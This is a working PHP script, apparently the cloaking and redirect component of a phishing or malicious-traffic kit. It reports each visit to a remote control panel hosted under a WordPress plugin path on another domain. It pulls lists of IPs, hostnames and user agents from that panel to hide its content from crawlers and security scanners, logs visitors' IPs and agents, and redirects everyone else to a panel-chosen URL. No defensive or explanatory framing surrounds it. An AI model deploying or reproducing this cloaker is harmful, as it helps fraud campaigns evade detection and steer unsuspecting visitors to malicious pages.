<?php
set_time_limit ( 0 );
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if (isset ( $_GET )) {
	$param_get = '';
	
	foreach ( $_GET as $nombre_campo => $valor ) {
		$param_get .= $nombre_campo . "=" . $valor . "&";
	}
	$l_get = "?" . $param_get;
}

if ($l_get == "?") {
	$l_get = "";
}

/* P4N3L */
$server = "http://www.indexarnos.com/wp-content/plugins/wpshield/blueberry/";
/* ##### */

$sub = $_SERVER ['HTTP_HOST'];
function strposa($haystack, $needle, $offset = 0) {
	if (! is_array ( $needle ))
		$needle = array (
				$needle 
		);
	foreach ( $needle as $query ) {
		
		 //echo $query."<br>";
		 if (preg_match ( "/".trim ( $query )."/i", $haystack ))
		 	return true; // stop on first true result
		 
		if (strpos ( $haystack, trim ( $query ), $offset ) !== false)
			return true; // stop on first true result
	}
	return false;
}



// Obtenemos datos de nuestra IP
if (curl_init ()) {
	$ch = curl_init ();
	curl_setopt ( $ch, CURLOPT_URL, "http://ipinfo.io/" . $_SERVER ['REMOTE_ADDR'] );
	curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, 1 );
	$details = curl_exec ( $ch );
	curl_close ( $ch );
} else 
	$details = file_get_contents ( "http://ipinfo.io/" . $ip );


$details = json_decode ( $details );

// obtenemos por array los txt
$visita = "http://" . $_SERVER ["SERVER_NAME"] . $_SERVER ["REQUEST_URI"];
$bloqued = file_get_contents ( $server . "get.php?setvisita=false&url=" . base64_encode ( $visita )."&useragent=".base64_encode($_SERVER ['HTTP_USER_AGENT'] ) );

$obj = json_decode ( $bloqued );

// 
$deniedIp = $obj [1];		//Block IP
$deniedHost = $obj [2];		//Block Hostname
$deniedAgent = $obj [3];	//Block UserAgent
$deniedSO = $obj [4];		//Block SO
$statusRedir = $obj [5];	//Status of redireccion ON or OFF
$blocknavigatorhtml = $obj [0] [2];  //BlockOsHTML

if($statusRedir == 'OFF'){
	include_once 'landing.php';
	die;
}




$ips = strposa ( $_SERVER ["REMOTE_ADDR"], $deniedIp );
$host = strposa ( $details->hostname, $deniedHost );
$agent = strposa ( $_SERVER ["HTTP_USER_AGENT"], $deniedAgent );
$SO = strposa ( $_SERVER ["HTTP_USER_AGENT"], $deniedSO );



$f = fopen ( "historial.txt", "a" );

if (($agent === true) || ($host === true) || ($ips === true)) {
	
	fwrite ( $f, "[ BLOCK ] " . date ( "Y-m-d h:i:s A" ) . " | " . $_SERVER ['REMOTE_ADDR'] . " | " . $_SERVER ['HTTP_USER_AGENT'] . " | " . $details->hostname . " | URL: " . $visita . "\n\r" );
	fclose ( $f );
	header ( "Location:" . $obj [0][1] );
	die ();
}
else if(($SO === true)){
	echo $blocknavigatorhtml; 
	die;	
}
else {
	fwrite ( $f, date ( "Y-m-d h:i:s A" ) . " | " . $_SERVER ['REMOTE_ADDR'] . " | " . $_SERVER ['HTTP_USER_AGENT'] . " | " . $details->hostname . " | URL: " . $visita . "\n\r" );
	fclose ( $f );

	$bloqued = file_get_contents ( $server . "get.php?setvisita=true&url=".base64_encode($obj [0][0]) );
	header ( "Location:" . $obj [0][0] . $l_get );
}

?>